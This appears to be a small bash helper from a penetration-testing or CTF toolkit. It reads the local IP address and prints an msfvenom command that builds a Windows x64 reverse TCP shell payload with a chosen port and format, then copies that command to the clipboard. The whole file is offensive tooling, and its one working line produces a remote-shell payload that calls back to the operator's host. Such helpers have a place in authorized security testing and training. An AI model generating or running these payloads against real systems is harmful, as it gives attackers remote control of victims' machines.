#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage: bash windows_64.sh [reverse port] [format]"
    exit 1
fi
IP=$( IP_No_Clip );                      
New_IP=$( echo -n $IP );                                                                                                              
echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$New_IP LPORT=$1 -f $2 -o reverse_$1.$2";
echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$New_IP LPORT=$1 -f $2 -o reverse_$1.$2" | clip;
